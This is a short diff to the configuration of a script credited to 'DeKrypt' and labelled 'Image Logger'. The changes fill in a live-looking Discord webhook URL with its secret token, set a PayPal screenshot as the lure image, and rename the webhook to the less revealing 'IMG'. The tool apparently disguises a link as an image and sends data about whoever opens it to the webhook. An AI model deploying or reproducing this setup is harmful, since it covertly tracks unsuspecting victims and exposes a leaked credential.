@@ -12,13 +12,13 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1334910445555028131/K_04lhnZ_BawQRF2D5U8G72WAuF3TY-L9ssiO8XenQJf9tGQbrsX4fxrER7CLRZDWSLj",
+    "image": "https://media.discordapp.net/attachments/1223187750312873984/1333320467666178190/Screenshot_20250127_071922_PayPal.jpg?ex=679dbcf3&is=679c6b73&hm=568d049935be581780f82571ab077afba0be5d3a00709b14067422393627b771&=&width=323&height=700", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "IMG", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
